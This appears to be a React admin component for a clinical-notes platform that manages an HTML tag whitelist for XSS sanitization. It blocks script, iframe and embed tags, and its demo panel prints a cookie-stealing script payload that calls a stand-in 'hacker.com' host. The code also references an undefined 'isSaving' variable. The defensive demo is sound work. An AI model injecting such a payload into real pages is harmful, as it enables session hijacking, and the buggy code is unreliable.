import React, { useState } from 'react';
import { Type, Code, Terminal, Save, ShieldAlert, FileCode2, CheckSquare } from 'lucide-react';
import { useApiMutation } from '@/shared/hooks/useApiMutation';
import { useNotification } from '@/shared/context/NotificationContext';

interface HtmlNodeRule {
    tag: string;
    description: string;
    isPermitted: boolean;
    isDangerous: boolean;
}

export const RichTextGovernance: React.FC = () => {
    const [rules, setRules] = useState<HtmlNodeRule[]>([
        { tag: '<b> / <strong>', description: 'Bold text formatting', isPermitted: true, isDangerous: false },
        { tag: '<i> / <em>', description: 'Italic text formatting', isPermitted: true, isDangerous: false },
        { tag: '<ul> / <li>', description: 'Unordered lists', isPermitted: true, isDangerous: false },
        { tag: '<script>', description: 'Executable JavaScript nodes', isPermitted: false, isDangerous: true },
        { tag: '<object> / <embed>', description: 'External browser plugins or flash', isPermitted: false, isDangerous: true },
        { tag: '<iframe>', description: 'Inline frames to external domains', isPermitted: false, isDangerous: true },
        { tag: '<h1> - <h3>', description: 'Structural headings', isPermitted: true, isDangerous: false }
    ]);

    const { showToast } = useNotification();

    const toggleRule = (tag: string) => {
        setRules(prev => prev.map(r => {
            if (r.tag === tag) return { ...r, isPermitted: !r.isPermitted };
            return r;
        }));
    };

    const saveMutation = useApiMutation('/platform/admin/dam/content/rich-text-policies', {
        onSuccess: () => { showToast('Rich text governance policies updated.', 'success'); },
        onError: () => { showToast('Failed to deploy content rules', 'error'); },
    });

    const handleSave = () => saveMutation.mutate({ rules });

    return (
        <div style={{ backgroundColor: 'white', border: '1px solid #E2E8F0', borderRadius: '12px', padding: '24px', marginTop: '16px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                    <div style={{ backgroundColor: '#F0FDF4', padding: '10px', borderRadius: '8px', border: '1px solid #BBF7D0' }}>
                        <FileCode2 size={24} color="#16A34A" />
                    </div>
                    <div>
                        <h3 data-cy="h3-rich-text-governance-0" style={{ margin: 0, fontSize: '1.2rem', color: '#0F172A', fontWeight: 800 }}>Rich Text (WYSIWYG) Governance</h3>
                        <p style={{ margin: '4px 0 0 0', color: '#64748B', fontSize: '0.9rem' }}>Control the strict HTML node whitelist used to sanitize database inputs.</p>
                    </div>
                </div>

                <div style={{ display: 'flex', gap: '12px' }}>
                    <button 
                        data-cy="btn-deploy-dom-policies"
                        onClick={handleSave}
                        disabled={isSaving}
                        style={{ backgroundColor: '#16A34A', color: 'white', border: 'none', borderRadius: '8px', padding: '10px 16px', fontWeight: 700, cursor: isSaving ? 'wait' : 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}
                    >
                        <Save size={16} /> {isSaving ? 'Updating Sanitizer...' : 'Deploy DOM Policies'}
                    </button>
                </div>
            </div>

            <div style={{ display: 'flex', gap: '24px' }}>
                <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: '12px' }}>
                    {rules.map(rule => (
                        <div key={rule.tag} style={{ 
                            display: 'flex', alignItems: 'center', justifyContent: 'space-between', 
                            padding: '16px', border: '1px solid #E2E8F0', borderRadius: '8px',
                            backgroundColor: rule.isDangerous ? (rule.isPermitted ? '#FEF2F2' : '#F8FAFC') : 'white'
                        }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                                <div style={{ 
                                    backgroundColor: rule.isPermitted ? '#10B981' : '#E2E8F0', 
                                    border: `1px solid ${rule.isPermitted ? '#059669' : '#CBD5E1'}`,
                                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                                    width: '24px', height: '24px', borderRadius: '6px', cursor: 'pointer',
                                    color: 'white'
                                }} data-cy={`richtext-rule-${rule.tag.replace(/[<> /]/g, '')}`} onClick={() => toggleRule(rule.tag)}>
                                    {rule.isPermitted && <CheckSquare size={16} />}
                                </div>
                                <div>
                                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                        <code style={{ fontSize: '0.9rem', color: '#0F172A', fontWeight: 800, backgroundColor: '#F1F5F9', padding: '2px 6px', borderRadius: '4px' }}>
                                            {rule.tag}
                                        </code>
                                        {rule.isDangerous && <span style={{ display: 'flex', alignItems: 'center', gap: '4px', fontSize: '0.65rem', backgroundColor: '#FEF2F2', color: '#DC2626', border: '1px solid #FECACA', padding: '2px 6px', borderRadius: '4px', fontWeight: 700 }}><ShieldAlert size={10} /> HIGH RISK</span>}
                                    </div>
                                    <div style={{ fontSize: '0.8rem', color: '#64748B', marginTop: '4px' }}>{rule.description}</div>
                                </div>
                            </div>
                        </div>
                    ))}
                </div>

                <div style={{ width: '380px', backgroundColor: '#1E293B', borderRadius: '12px', padding: '20px', color: '#F8FAFC', display: 'flex', flexDirection: 'column', height: 'fit-content' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 700, marginBottom: '16px', color: '#94A3B8' }}>
                        <Terminal size={18} /> Backend Sanitization Proxy
                    </div>
                    
                    <p style={{ fontSize: '0.85rem', color: '#CBD5E1', lineHeight: 1.6, marginTop: 0 }}>
                        When clinical staff paste text from Microsoft Word into PrimeCare clinical notes, hidden HTML nodes are captured. 
                    </p>
                    <p style={{ fontSize: '0.85rem', color: '#CBD5E1', lineHeight: 1.6 }}>
                        To prevent XSS (Cross-Site Scripting) attacks, the backend edge-proxy uses this exact whitelist to permanently strip unapproved nodes before hitting PostgreSQL.
                    </p>

                    <div style={{ backgroundColor: '#0F172A', padding: '16px', borderRadius: '8px', border: '1px solid #334155', marginTop: '16px' }}>
                        <div style={{ fontSize: '0.75rem', color: '#64748B', marginBottom: '8px', fontFamily: 'monospace' }}>RAW INPUT PAYLOAD:</div>
                        <div style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: '#EF4444', marginBottom: '16px', wordBreak: 'break-all' }}>
                            {"<script>fetch('http://hacker.com?cookie='+document.cookie)</script><b>Patient feels well.</b>"}
                        </div>
                        
                        <div style={{ fontSize: '0.75rem', color: '#64748B', marginBottom: '8px', fontFamily: 'monospace' }}>CLEANED DATABASE SAVE:</div>
                        <div style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: '#10B981' }}>
                            {"<b>Patient feels well.</b>"}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};
